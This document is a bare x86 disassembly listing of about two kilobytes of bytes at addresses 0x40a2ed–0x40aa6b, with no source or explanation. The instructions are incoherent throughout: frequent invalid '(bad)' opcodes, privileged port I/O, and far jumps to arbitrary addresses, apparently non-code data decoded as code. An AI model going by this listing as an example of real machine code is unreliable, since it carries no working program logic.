  40a2ed:	xor    eax,0xd74091d0
  40a2f2:	lods   al,BYTE PTR ds:[esi]
  40a2f3:	mov    ds:0x863bf157,eax
  40a2f8:	pop    ebp
  40a2f9:	ja     0x40a2c6
  40a2fb:	mov    ebx,DWORD PTR [ebp+0x77d9b101]
  40a301:	xchg   ecx,eax
  40a302:	mov    ah,0x94
  40a304:	out    0x1e,al
  40a306:	sub    DWORD PTR [edx+0x6356a268],ebp
  40a30c:	xor    esi,ebx
  40a30e:	adc    BYTE PTR [ebx-0x2c],dh
  40a311:	cli    
  40a312:	jne    0x40a2a6
  40a314:	sti    
  40a315:	cld    
  40a316:	jno    0x40a33a
  40a318:	pop    ds
  40a319:	imul   ebp,edi,0xffffffcd
  40a31c:	mov    ecx,esi
  40a31e:	test   BYTE PTR [edi],ah
  40a320:	jae    0x40a30f
  40a322:	adc    dh,BYTE PTR [ebp+0x6f]
  40a325:	cmp    ecx,DWORD PTR [eax+0x2f]
  40a328:	gs call 0x2e0a6064
  40a32e:	data16 fwait
  40a330:	loope  0x40a35a
  40a332:	pop    ebx
  40a333:	clc    
  40a334:	pop    ebp
  40a335:	(bad)  
  40a336:	sar    DWORD PTR [edi],1
  40a338:	push   edx
  40a339:	mov    ch,0x48
  40a33b:	arpl   WORD PTR [ecx],dx
  40a33d:	add    BYTE PTR [edx+esi*4],bh
  40a340:	jg     0x40a350
  40a342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a343:	xchg   BYTE PTR [edi+ecx*8+0x66],al
  40a347:	or     al,0xf4
  40a349:	ret    0x491c
  40a34c:	fidivr WORD PTR [bp-0x26d5]
  40a351:	push   ds
  40a352:	(bad)  
  40a353:	rcr    DWORD PTR [ebx],cl
  40a355:	jge    0x40a359
  40a357:	mov    al,0xa6
  40a359:	gs add al,0x75
  40a35c:	das    
  40a35d:	jmp    0x40a335
  40a35f:	inc    edx
  40a360:	sbb    DWORD PTR [eax+0x6a7f3477],0xa131f08
  40a36a:	shl    esi,0x7
  40a36d:	cmp    al,0x9b
  40a36f:	add    al,BYTE PTR [edx+0x35a8525c]
  40a375:	fst    DWORD PTR [edi-0x2d]
  40a378:	xchg   edi,eax
  40a379:	jp     0x40a337
  40a37b:	mov    eax,ds:0x2c2caa59
  40a380:	xchg   esp,eax
  40a381:	outs   dx,BYTE PTR ds:[esi]
  40a382:	call   0x1eaf:0xc08e897d
  40a389:	not    ebx
  40a38b:	je     0x40a3c2
  40a38d:	inc    esi
  40a38e:	add    DWORD PTR [edi+edx*1+0x5e],ecx
  40a392:	push   esi
  40a393:	jbe    0x40a333
  40a395:	or     ch,BYTE PTR [edi-0xb5fba0]
  40a39b:	scas   eax,DWORD PTR es:[edi]
  40a39c:	mov    eax,ds:0xb388e301
  40a3a1:	bound  edx,QWORD PTR ds:0x243e1c7d
  40a3a7:	enter  0x95ea,0x3b
  40a3ab:	(bad)  
  40a3ac:	scas   al,BYTE PTR es:[edi]
  40a3ad:	inc    ecx
  40a3ae:	or     BYTE PTR [ebp-0x6a],dl
  40a3b1:	adc    DWORD PTR [ebp+0x63e57634],ebp
  40a3b7:	loopne 0x40a428
  40a3b9:	out    0xb2,eax
  40a3bb:	test   BYTE PTR [ebx+eiz*4-0x36],bh
  40a3bf:	out    dx,eax
  40a3c0:	dec    edi
  40a3c1:	ins    DWORD PTR es:[edi],dx
  40a3c2:	pop    eax
  40a3c3:	retf   
  40a3c4:	idiv   DWORD PTR [eax-0x4b]
  40a3c7:	cmc    
  40a3c8:	int3   
  40a3c9:	add    cl,BYTE PTR [esi+0x5e]
  40a3cc:	or     DWORD PTR [esi-0x2a4a5cc5],esi
  40a3d2:	mov    ebx,0xf6b3e060
  40a3d7:	pop    ebx
  40a3d8:	fild   DWORD PTR [edi+0x3a]
  40a3db:	mov    edx,DWORD PTR [ecx+ebx*1+0x6f]
  40a3df:	cmp    DWORD PTR [esi-0x48946800],ebx
  40a3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3e7:	imul   eax,DWORD PTR [ecx],0x8c8ae462
  40a3ed:	and    cl,0xc
  40a3f0:	push   esi
  40a3f1:	jecxz  0x40a3c2
  40a3f3:	bswap  eax
  40a3f5:	pop    edi
  40a3f6:	sbb    eax,0xe708524c
  40a3fb:	pop    ecx
  40a3fc:	sub    eax,DWORD PTR [eax+0x54]
  40a3ff:	adc    eax,0x52b82146
  40a404:	mov    ds:0xd424bc7a,al
  40a409:	inc    edx
  40a40a:	fsub   DWORD PTR [edx-0x2a]
  40a40d:	sbb    al,0x21
  40a40f:	add    BYTE PTR [edi],dh
  40a411:	jbe    0x40a467
  40a413:	ja     0x40a411
  40a415:	retf   0x8e59
  40a418:	lods   eax,DWORD PTR ds:[esi]
  40a419:	mov    dh,0x8d
  40a41b:	xchg   DWORD PTR es:0x56f6142d,ebx
  40a422:	pop    ss
  40a423:	inc    ebp
  40a424:	mov    ds:0xd9482a18,eax
  40a429:	xchg   ecx,eax
  40a42a:	or     cl,ch
  40a42c:	mov    ah,0xb0
  40a42e:	cld    
  40a42f:	mov    es,WORD PTR [ebp+0x293a5f69]
  40a435:	ss (bad) 
  40a439:	arpl   WORD PTR [edx+0x7e9abb52],bx
  40a43f:	leave  
  40a440:	out    0xf,al
  40a442:	jno    0x40a3d9
  40a444:	push   edx
  40a445:	and    DWORD PTR gs:[eax+0x48],ebx
  40a449:	sub    al,BYTE PTR ds:0x91bfc85c
  40a44f:	push   ss
  40a450:	repnz adc BYTE PTR [esi+0x55],0xdb
  40a455:	xchg   esi,eax
  40a456:	dec    esi
  40a457:	daa    
  40a458:	sbb    ebp,DWORD PTR [ebx]
  40a45a:	sub    BYTE PTR [edi-0x27e9873e],0xba
  40a461:	jae    0x40a451
  40a463:	xlat   BYTE PTR ds:[ebx]
  40a464:	pop    ds
  40a465:	aaa    
  40a466:	dec    ebx
  40a467:	jbe    0x40a4b9
  40a469:	call   0x8b640c1e
  40a46e:	inc    esp
  40a46f:	and    dl,cl
  40a471:	dec    ebp
  40a472:	test   eax,0xa08895d7
  40a477:	iret   
  40a478:	cmovo  edi,edx
  40a47b:	sub    edx,DWORD PTR [eax-0x3f8c82c2]
  40a481:	jmp    0xfb5e:0xc31b3bf8
  40a488:	clc    
  40a489:	dec    esp
  40a48a:	adc    BYTE PTR [esi],bh
  40a48c:	push   ebx
  40a48d:	retf   
  40a48e:	mov    dl,0x9
  40a490:	inc    esi
  40a491:	fist   WORD PTR [edi-0x3920ef30]
  40a497:	xchg   DWORD PTR [ebx+ecx*8+0x4c],esp
  40a49b:	xor    ah,BYTE PTR [eax]
  40a49d:	dec    esi
  40a49e:	test   eax,0x734bf1d9
  40a4a3:	xchg   ah,bl
  40a4a5:	out    dx,eax
  40a4a6:	rcl    BYTE PTR [edi],1
  40a4a8:	bound  edx,QWORD PTR [edi]
  40a4aa:	xchg   ebp,eax
  40a4ab:	inc    esi
  40a4ac:	pushf  
  40a4ad:	aam    0xc8
  40a4af:	loope  0x40a4a3
  40a4b1:	scas   eax,DWORD PTR es:[edi]
  40a4b2:	inc    edi
  40a4b3:	and    ch,cl
  40a4b5:	pop    ss
  40a4b6:	mov    bh,0xa0
  40a4b8:	fisub  DWORD PTR [edi+0x913d0bf]
  40a4be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4bf:	(bad)  
  40a4c0:	and    eax,DWORD PTR [ecx-0x58a0b974]
  40a4c6:	ins    DWORD PTR es:[edi],dx
  40a4c7:	and    BYTE PTR [ebx-0x17892978],0x79
  40a4ce:	loopne 0x40a4cb
  40a4d0:	hlt    
  40a4d1:	outs   dx,BYTE PTR ds:[esi]
  40a4d2:	xchg   BYTE PTR [ebp+0x19],ch
  40a4d5:	stc    
  40a4d6:	(bad)  
  40a4d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d8:	pop    ebx
  40a4d9:	jge    0x40a45c
  40a4db:	mov    BYTE PTR [esi-0x61231678],al
  40a4e1:	(bad)  
  40a4e2:	cmp    al,0x1d
  40a4e4:	cld    
  40a4e5:	int3   
  40a4e6:	loop   0x40a4af
  40a4e8:	pop    esi
  40a4e9:	xor    al,0x7e
  40a4eb:	jmp    0x40a486
  40a4ed:	mov    eax,ds:0x92f87c2e
  40a4f2:	pop    edx
  40a4f3:	adc    DWORD PTR [edi+0x5260fc41],ecx
  40a4f9:	sub    DWORD PTR [ecx+0x4a],ebx
  40a4fc:	loope  0x40a515
  40a4fe:	inc    esi
  40a4ff:	jno    0x40a501
  40a501:	mov    ah,BYTE PTR [ebx+0x5f]
  40a504:	in     al,dx
  40a505:	pop    ss
  40a506:	and    BYTE PTR [edi],cl
  40a508:	xchg   esp,eax
  40a509:	and    DWORD PTR [ecx+0x34],0x3b31e7f6
  40a510:	shl    BYTE PTR [esi+0x441b2f58],1
  40a516:	or     BYTE PTR [esp+eiz*2+0x26be45b6],dh
  40a51d:	test   BYTE PTR [eax+edi*1],ah
  40a520:	xchg   edx,eax
  40a521:	xchg   esp,eax
  40a522:	mul    BYTE PTR [ebp+0x433e9054]
  40a528:	mov    edi,0x67ee9551
  40a52d:	ins    DWORD PTR es:[edi],dx
  40a52e:	lods   al,BYTE PTR ds:[esi]
  40a52f:	push   edi
  40a530:	push   edx
  40a531:	add    bl,BYTE PTR [ebp-0x43]
  40a534:	jo     0x40a51d
  40a536:	aaa    
  40a537:	jmp    0x40a59c
  40a539:	mov    DWORD PTR [ebx],edi
  40a53b:	das    
  40a53c:	fisttp QWORD PTR [edi+eax*4+0x2f01a290]
  40a543:	call   0xb348:0x746d6f56
  40a54a:	out    dx,eax
  40a54b:	in     eax,dx
  40a54c:	scas   eax,DWORD PTR es:[edi]
  40a54d:	lods   eax,DWORD PTR ds:[esi]
  40a54e:	ss jne 0x40a502
  40a551:	ret    0x34f4
  40a554:	and    BYTE PTR [esi+ecx*4-0x15f697fa],0x33
  40a55c:	pop    ss
  40a55d:	(bad)
  40a561:	fs or  bl,al
  40a564:	iret   
  40a565:	and    al,0xd0
  40a567:	mov    DWORD PTR [edi],esp
  40a569:	push   ds
  40a56a:	and    DWORD PTR [ebx-0x5b941b54],esp
  40a570:	cmp    ah,0x62
  40a573:	int    0xb0
  40a575:	test   eax,0x282ea5a7
  40a57a:	hlt    
  40a57b:	add    BYTE PTR [ebx-0x32],bh
  40a57e:	popa   
  40a57f:	enter  0xbecd,0xb3
  40a583:	jae    0x40a565
  40a585:	dec    esp
  40a586:	adc    DWORD PTR [ecx],esi
  40a588:	pop    esp
  40a589:	ficomp WORD PTR [ecx+0x17]
  40a58c:	mov    ds:0x37a17498,eax
  40a591:	outs   dx,DWORD PTR ds:[esi]
  40a592:	fs ins DWORD PTR es:[edi],dx
  40a594:	repnz xor al,0xf5
  40a597:	neg    ecx
  40a599:	adc    eax,0x19729366
  40a59e:	outs   dx,BYTE PTR ds:[esi]
  40a59f:	into   
  40a5a0:	lods   eax,DWORD PTR ds:[esi]
  40a5a1:	cmp    edi,ebp
  40a5a3:	fstp   QWORD PTR [ebx]
  40a5a5:	adc    BYTE PTR [ecx+0x10642f1],cl
  40a5ab:	jns    0x40a5b7
  40a5ad:	sbb    eax,DWORD PTR [esi]
  40a5af:	(bad)  
  40a5b2:	mov    ebp,0xffa2c1c8
  40a5b7:	push   ds
  40a5b8:	bswap  eax
  40a5ba:	imul   eax,DWORD PTR [edi+0x265e5f3],0x2c
  40a5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c2:	cmp    eax,0xdc5dbf35
  40a5c7:	test   BYTE PTR [edi],cl
  40a5c9:	in     al,0xa3
  40a5cb:	add    edi,DWORD PTR [edx+0x755b3ab7]
  40a5d1:	jo     0x40a611
  40a5d3:	not    dl
  40a5d5:	les    edi,FWORD PTR ds:0x92645bef
  40a5db:	or     edx,edi
  40a5dd:	hlt    
  40a5de:	mov    edx,0xad350608
  40a5e3:	idiv   DWORD PTR [edx-0x5b]
  40a5e6:	shrd   DWORD PTR [ecx+0x6678412d],esi,0x47
  40a5ee:	imul   edi,ebp,0xf20fdd12
  40a5f4:	push   ds
  40a5f5:	dec    edx
  40a5f6:	es fsubr st(2),st
  40a5f9:	test   al,0x2
  40a5fb:	jbe    0x40a677
  40a5fd:	in     eax,dx
  40a5fe:	or     eax,0x1e385322
  40a603:	aas    
  40a604:	mov    ecx,0x3c4a8c12
  40a609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a60a:	or     al,BYTE PTR ss:[ecx+0x4a]
  40a60e:	and    edi,esi
  40a610:	mov    ch,0x46
  40a612:	into   
  40a613:	xor    BYTE PTR [edx],ah
  40a615:	aad    0xdd
  40a617:	mov    dh,0x64
  40a619:	sti    
  40a61a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a61b:	cwde   
  40a61c:	cmp    dh,BYTE PTR [edi+ebx*2-0x4ab80899]
  40a623:	or     al,0x4e
  40a625:	ins    BYTE PTR es:[edi],dx
  40a626:	scas   eax,DWORD PTR es:[edi]
  40a627:	test   dh,bl
  40a629:	inc    ebx
  40a62a:	mov    esi,0x2e6e8e2a
  40a62f:	ins    DWORD PTR es:[edi],dx
  40a630:	arpl   WORD PTR [edi+eiz*8-0x7b],bx
  40a634:	sbb    dl,BYTE PTR [eax]
  40a636:	gs loope 0x40a676
  40a639:	xor    al,0xf6
  40a63b:	aas    
  40a63c:	push   es
  40a63d:	pop    esi
  40a63e:	or     dl,BYTE PTR [eax]
  40a640:	or     ebx,DWORD PTR [ebx-0x13]
  40a643:	push   edi
  40a644:	pop    esi
  40a645:	jmp    0x4c615bab
  40a64a:	xchg   bx,ax
  40a64c:	addr16 jne 0x40a5ef
  40a64f:	mov    eax,ds:0x229692dd
  40a654:	jmp    0x40a6c9
  40a656:	dec    ebx
  40a657:	out    dx,al
  40a658:	out    dx,al
  40a659:	sbb    BYTE PTR [ebp-0x14f4b9b4],bl
  40a65f:	or     bl,BYTE PTR [ebp+0x63ed05b8]
  40a665:	into   
  40a666:	test   al,0x96
  40a668:	int3   
  40a669:	fs test eax,0xa8c1cc42
  40a66f:	add    dh,BYTE PTR [esp+eax*8-0x5f3807fa]
  40a676:	mov    esi,0xfd77d218
  40a67b:	jmp    0x6b01a6cd
  40a680:	(bad)  
  40a681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a682:	scas   al,BYTE PTR es:[edi]
  40a683:	pop    ebp
  40a684:	lahf   
  40a685:	mov    edx,0x2759b4f0
  40a68a:	fidivr WORD PTR gs:[ebx+ecx*2]
  40a68e:	cmp    dh,BYTE PTR ds:0x25a34420
  40a694:	test   al,0xa8
  40a696:	loope  0x40a6ca
  40a698:	or     BYTE PTR [edx-0x11],dl
  40a69b:	mov    bh,0xb
  40a69d:	sub    al,0xd7
  40a69f:	pop    esi
  40a6a0:	cmp    ecx,DWORD PTR ds:[ebx+0x1b]
  40a6a4:	jns    0x40a656
  40a6a6:	push   edx
  40a6a7:	dec    ecx
  40a6a8:	pushf  
  40a6a9:	jp     0x40a70b
  40a6ab:	mov    al,ds:0xacc3df09
  40a6b0:	push   0xffffff9a
  40a6b2:	push   ebp
  40a6b3:	rcl    BYTE PTR [esi-0x69],cl
  40a6b6:	imul   DWORD PTR [edx-0x4a7ab46d]
  40a6bc:	fisttp QWORD PTR [eax+0x1a]
  40a6bf:	int    0xdd
  40a6c1:	push   es
  40a6c2:	jmp    0x14b15f02
  40a6c7:	cdq    
  40a6c8:	xor    BYTE PTR [edx],0x35
  40a6cb:	aaa    
  40a6cc:	and    eax,0x3f90df4c
  40a6d1:	mov    bh,0xcb
  40a6d3:	and    eax,0xfe91dc54
  40a6d8:	in     al,dx
  40a6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6db:	mov    al,ds:0xef63db71
  40a6e0:	push   cs
  40a6e1:	dec    edx
  40a6e2:	dec    edx
  40a6e3:	inc    esp
  40a6e4:	sahf   
  40a6e5:	inc    ecx
  40a6e6:	mov    eax,0xbfe57ca3
  40a6eb:	hlt    
  40a6ec:	mov    bl,0x8a
  40a6ee:	loope  0x40a6f0
  40a6f0:	cdq    
  40a6f1:	lahf   
  40a6f2:	jl     0x40a6bd
  40a6f4:	push   edi
  40a6f5:	(bad)  
  40a6f6:	out    0x9a,al
  40a6f8:	cmp    al,0x6f
  40a6fa:	fist   DWORD PTR [ecx-0x24]
  40a6fd:	scas   al,BYTE PTR es:[edi]
  40a6fe:	loopne 0x40a6bd
  40a700:	cwde   
  40a701:	push   0x7f
  40a703:	adc    eax,0xfd366206
  40a708:	loope  0x40a6e6
  40a70a:	mov    dh,0xec
  40a70c:	mov    BYTE PTR [edx-0x65],bh
  40a70f:	cli    
  40a710:	or     eax,0xc77841d5
  40a715:	jae    0x40a699
  40a717:	sub    al,0xf6
  40a719:	jbe    0x40a753
  40a71b:	aam    0x2a
  40a71d:	or     eax,0x2dba21f8
  40a722:	imul   esp,eax,0xffffff91
  40a725:	pop    es
  40a726:	enter  0x35df,0x0
  40a72a:	ds push edi
  40a72c:	cwde   
  40a72d:	daa    
  40a72e:	ret    
  40a72f:	ins    DWORD PTR es:[edi],dx
  40a730:	out    dx,al
  40a731:	or     DWORD PTR [eax+eax*2],edx
  40a734:	mov    al,ds:0xc310e093
  40a739:	xor    eax,0xbdb46f3c
  40a73e:	or     ebp,DWORD PTR [edi+0x4e]
  40a741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a742:	inc    ebx
  40a743:	push   di
  40a745:	nop
  40a746:	sub    DWORD PTR [eax],ebp
  40a748:	inc    ecx
  40a749:	rol    BYTE PTR [edx+0x63],0xbc
  40a74d:	lock pop ds
  40a74f:	add    ebp,ebx
  40a751:	dec    ebx
  40a752:	ins    BYTE PTR es:[edi],dx
  40a753:	push   ebx
  40a754:	add    cl,BYTE PTR [eax+0x1700098]
  40a75a:	push   ebx
  40a75b:	sbb    dh,BYTE PTR [ebp+0x5f43e17c]
  40a761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a762:	sub    eax,DWORD PTR [ecx]
  40a764:	or     DWORD PTR [esi],edi
  40a766:	addr16 test al,0x8c
  40a769:	pop    ss
  40a76a:	inc    ecx
  40a76b:	ret    0xc0ce
  40a76e:	adc    dh,cl
  40a770:	mov    edi,0x57940f90
  40a775:	cld    
  40a776:	or     eax,0x22735242
  40a77b:	ret    
  40a77c:	(bad)
  40a780:	mov    DWORD PTR [edi-0x56bc0fc0],eax
  40a786:	add    eax,0x91e90e96
  40a78b:	jle    0x40a7c2
  40a78d:	xlat   BYTE PTR ds:[ebx]
  40a78e:	jno    0x40a73d
  40a790:	inc    esp
  40a791:	(bad)  
  40a792:	dec    esp
  40a793:	or     edi,DWORD PTR [eax+0x75940e25]
  40a799:	ds out 0x7f,al
  40a79c:	test   DWORD PTR [ebx+0x27371bc2],esi
  40a7a2:	jne    0x40a802
  40a7a4:	mov    al,0xc8
  40a7a6:	into   
  40a7a7:	adc    eax,0x4898c425
  40a7ac:	scas   eax,DWORD PTR es:[edi]
  40a7ad:	call   0x2eca:0xd1ec39c0
  40a7b4:	pop    ebx
  40a7b5:	leave  
  40a7b6:	pop    ss
  40a7b7:	mov    edi,0x27a1f810
  40a7bc:	mov    ecx,0x6bbd739a
  40a7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c2:	mov    bh,0x30
  40a7c4:	pop    edx
  40a7c5:	and    al,0xa
  40a7c7:	mov    ah,0x7f
  40a7c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7ca:	retf   0xff6a
  40a7cd:	mov    ecx,0xacf8f801
  40a7d2:	in     al,dx
  40a7d3:	(bad)  
  40a7d4:	enter  0x637d,0x38
  40a7d8:	stc    
  40a7d9:	mov    cl,0x95
  40a7db:	(bad)  
  40a7dc:	pusha  
  40a7dd:	jo     0x40a765
  40a7df:	cld    
  40a7e0:	inc    ecx
  40a7e1:	push   0x5cced1d
  40a7e6:	mov    cl,0x4d
  40a7e8:	mov    esi,DWORD PTR [esi+0x1d]
  40a7eb:	test   al,0xee
  40a7ed:	jecxz  0x40a83c
  40a7ef:	cmp    eax,0x9b7dffca
  40a7f4:	cmp    al,0x11
  40a7f6:	mov    ecx,0xace7a6a2
  40a7fb:	ja     0x40a7d1
  40a7fd:	or     ebx,DWORD PTR [ecx+0x5316e102]
  40a803:	xor    eax,0x3e2bd394
  40a808:	mov    al,ds:0xfb8e2897
  40a80d:	out    dx,al
  40a80e:	sar    DWORD PTR [esi+0x15],cl
  40a811:	in     al,dx
  40a812:	int    0x68
  40a814:	pop    edx
  40a815:	clc    
  40a816:	call   0x1d64:0xc4bed153
  40a81d:	pop    ebx
  40a81e:	scas   eax,DWORD PTR es:[edi]
  40a81f:	pop    edi
  40a820:	dec    ebp
  40a821:	xor    dl,BYTE PTR [edx+0x5816b6be]
  40a827:	pop    eax
  40a828:	scas   eax,DWORD PTR es:[edi]
  40a829:	sbb    DWORD PTR [ecx+0x74],eax
  40a82c:	pop    esp
  40a82d:	dec    ecx
  40a82e:	imul   BYTE PTR [edi+0x21756162]
  40a834:	or     BYTE PTR [esi],cl
  40a836:	pop    esp
  40a837:	cmp    eax,0x79da7d10
  40a83c:	push   0xfdd8a3a
  40a841:	iret   
  40a842:	and    DWORD PTR [edi],ebx
  40a844:	lahf   
  40a845:	mov    ch,0x5a
  40a847:	pop    es
  40a848:	dec    eax
  40a849:	int    0xb7
  40a84b:	or     eax,0xc892b2fa
  40a850:	in     al,dx
  40a851:	rcl    dl,cl
  40a853:	pop    ss
  40a854:	inc    esp
  40a855:	mov    ebp,0x7b91a945
  40a85a:	xchg   ecx,eax
  40a85b:	cdq    
  40a85c:	adc    DWORD PTR [edx],0x51
  40a85f:	pop    ebx
  40a860:	sub    edi,DWORD PTR [eax-0x409c7af4]
  40a866:	xor    al,0x72
  40a868:	push   ss
  40a869:	pop    edi
  40a86a:	adc    eax,0x6924ace0
  40a86f:	push   ebx
  40a870:	xor    BYTE PTR [eax],0x2a
  40a873:	test   BYTE PTR ds:0xdbfd0fb7,0xb
  40a87a:	fld    TBYTE PTR [edx+0x6841b4dc]
  40a880:	mov    dl,0xfd
  40a882:	idiv   DWORD PTR [eax+0x15]
  40a885:	mov    edx,0x311e0e46
  40a88a:	int    0x60
  40a88c:	fwait
  40a88d:	sub    eax,0xfc0599b5
  40a892:	push   es
  40a893:	pop    ecx
  40a894:	in     eax,0xf5
  40a896:	xor    ebx,DWORD PTR [eax-0xed981cf]
  40a89c:	mov    ecx,DWORD PTR [ecx+0x503c69e5]
  40a8a2:	mov    ds:0x6430fc36,al
  40a8a7:	dec    edi
  40a8a8:	in     al,0xa6
  40a8aa:	gs enter 0x8850,0x61
  40a8af:	call   0xa95d:0xee0547dd
  40a8b6:	adc    al,0xa2
  40a8b8:	sbb    dh,BYTE PTR [ebx+0x1dee817e]
  40a8be:	add    ch,BYTE PTR [edx-0x3a3f141c]
  40a8c4:	hlt    
  40a8c5:	dec    ebx
  40a8c6:	sar    bh,cl
  40a8c8:	push   ecx
  40a8c9:	sub    DWORD PTR [eax],ecx
  40a8cb:	sub    BYTE PTR [eax-0x73],0xad
  40a8cf:	fwait
  40a8d0:	add    BYTE PTR [esi],0x3e
  40a8d3:	test   al,0x15
  40a8d5:	iret   
  40a8d6:	push   eax
  40a8d7:	jecxz  0x40a87f
  40a8d9:	imul   ebx,DWORD PTR [ebx+0x70544669],0xfffffff8
  40a8e0:	pop    ebp
  40a8e1:	and    al,0xb
  40a8e3:	shr    DWORD PTR [ecx],1
  40a8e5:	sbb    al,0xe8
  40a8e7:	sub    eax,0x9adb12fd
  40a8ec:	lahf   
  40a8ed:	mov    ds,WORD PTR [eax+0x15d2de5d]
  40a8f3:	push   ebp
  40a8f4:	jbe    0x40a949
  40a8f6:	mov    BYTE PTR [ebx+0x16],bh
  40a8f9:	enter  0x72a4,0x91
  40a8fd:	cli    
  40a8fe:	mov    ebx,0xf7c05035
  40a903:	pop    es
  40a904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a905:	dec    eax
  40a906:	mov    al,ds:0xcfeb3d7d
  40a90b:	adc    bh,BYTE PTR [eax-0x348d58d7]
  40a911:	das    
  40a912:	retf   0x47bf
  40a915:	cmp    al,0x58
  40a917:	daa    
  40a918:	jno    0x40a8cc
  40a91a:	mov    eax,0xf2d35e40
  40a91f:	icebp  
  40a920:	jecxz  0x40a8a9
  40a922:	outs   dx,BYTE PTR ds:[esi]
  40a923:	fidivr DWORD PTR [edi-0x4c]
  40a926:	les    ecx,FWORD PTR ds:0x5fdab83
  40a92c:	dec    DWORD PTR [eax+0x7b]
  40a92f:	pusha  
  40a930:	or     al,0xbc
  40a932:	fwait
  40a933:	loopne 0x40a8fc
  40a935:	aas    
  40a936:	adc    bh,BYTE PTR [ebx+0x56]
  40a939:	lahf   
  40a93a:	fcomip st,st(3)
  40a93c:	mov    fs,WORD PTR [esi+0x7c]
  40a93f:	in     al,0xf8
  40a941:	ja     0x40a8fb
  40a943:	test   al,0x4e
  40a945:	out    0x4e,eax
  40a947:	scas   eax,DWORD PTR es:[edi]
  40a948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a949:	imul   esp,eax,0x171d6d36
  40a94f:	mov    DWORD PTR [ecx+0x12],eax
  40a952:	lea    ebx,[esi]
  40a954:	psubsw mm4,mm1
  40a957:	cwde   
  40a958:	out    dx,al
  40a959:	mov    esi,0xb820d985
  40a95e:	mov    cl,0xfa
  40a960:	call   0x9d5daf22
  40a965:	xor    DWORD PTR [ecx-0x4b],0xc2405c00
  40a96c:	loope  0x40a932
  40a96e:	ds and ebx,edx
  40a971:	or     dl,BYTE PTR [edi]
  40a973:	stos   BYTE PTR es:[edi],al
  40a974:	inc    ebx
  40a975:	mov    esp,0x8b9914f2
  40a97a:	push   esi
  40a97b:	mov    ah,0x90
  40a97d:	adc    BYTE PTR [esi-0x1116e3d6],ch
  40a983:	fidiv  WORD PTR [edi+0x54df6c3a]
  40a989:	push   0xffffffbf
  40a98b:	(bad)  
  40a98c:	sar    esp,1
  40a98e:	sub    eax,0x7633bcaf
  40a993:	aaa    
  40a994:	ja     0x40aa0b
  40a996:	pop    ss
  40a997:	rol    BYTE PTR [edi+0x1b563b5d],1
  40a99d:	rcl    DWORD PTR [ebp+0x3e7aa8c],0x26
  40a9a4:	fadd   QWORD PTR [ecx+0x2b]
  40a9a7:	fs mov esp,0xbcbf7a83
  40a9ad:	jbe    0x40aa1b
  40a9af:	ins    DWORD PTR es:[edi],dx
  40a9b0:	call   0xa592:0x1b056162
  40a9b7:	push   ebp
  40a9b8:	mov    DWORD PTR [edi],edi
  40a9ba:	dec    edx
  40a9bb:	pop    ebp
  40a9bc:	test   esp,ebx
  40a9be:	cmp    DWORD PTR [edi+0x7],edi
  40a9c1:	inc    edi
  40a9c2:	push   eax
  40a9c3:	push   0x201de0e1
  40a9c8:	jbe    0x40aa48
  40a9ca:	jmp    FWORD PTR [ecx-0x36]
  40a9cd:	leave  
  40a9ce:	push   ss
  40a9cf:	xor    DWORD PTR [ebp+0x3fa81c7f],edx
  40a9d5:	ds repnz dec eax
  40a9d8:	xor    DWORD PTR [esi-0x5a],esi
  40a9db:	pop    eax
  40a9dc:	pop    ecx
  40a9dd:	das    
  40a9de:	bound  ebx,QWORD PTR [edx-0xa6114a9]
  40a9e4:	sar    BYTE PTR [edi],cl
  40a9e6:	sbb    eax,0x69657880
  40a9eb:	cs pop ss
  40a9ed:	jecxz  0x40aa36
  40a9ef:	mov    ecx,0xc3bb9ec6
  40a9f4:	mov    eax,ds:0x2e2b9801
  40a9f9:	push   cs
  40a9fa:	push   ss
  40a9fb:	pop    eax
  40a9fc:	shr    BYTE PTR [eax+ebp*1],0xb9
  40aa00:	pop    edx
  40aa01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa02:	es das 
  40aa04:	xor    DWORD PTR [edx-0x44b0ddd0],edx
  40aa0a:	das    
  40aa0b:	or     edx,DWORD PTR [ebx]
  40aa0d:	scas   eax,DWORD PTR es:[edi]
  40aa0e:	ret    0x9005
  40aa11:	cdq    
  40aa12:	(bad)  
  40aa13:	mov    edi,0x9b43ca55
  40aa18:	jb     0x40a9ab
  40aa1a:	ins    BYTE PTR es:[edi],dx
  40aa1b:	loopne 0x40aa24
  40aa1d:	add    eax,0x13fa8837
  40aa22:	in     eax,dx
  40aa23:	in     eax,0xa2
  40aa25:	or     BYTE PTR [esi],cl
  40aa27:	repz ror DWORD PTR [esi+0x1e],0x13
  40aa2c:	arpl   WORD PTR [ecx-0x1acb97a4],bx
  40aa32:	pop    ss
  40aa33:	pop    esp
  40aa34:	xor    BYTE PTR [edx+0x71746ca1],bh
  40aa3a:	scas   eax,DWORD PTR es:[edi]
  40aa3b:	mov    ebx,0x6ea6ab43
  40aa40:	jmp    0xe9459e0b
  40aa45:	jg     0x40a9cc
  40aa47:	mov    BYTE PTR [ecx+0x33],bl
  40aa4a:	and    bl,BYTE PTR [ecx-0x56362e8e]
  40aa50:	inc    esi
  40aa51:	aad    0x31
  40aa53:	mov    ah,0x63
  40aa55:	repnz in eax,0x86
  40aa58:	(bad)  [edx]
  40aa5a:	cmp    DWORD PTR [ecx+0x140a9f8b],ebp
  40aa60:	fisubr DWORD PTR [eax]
  40aa62:	das    
  40aa63:	xor    eax,0x22d55e30
  40aa68:	pop    edx
  40aa69:	repz into 
  40aa6b:	clc    
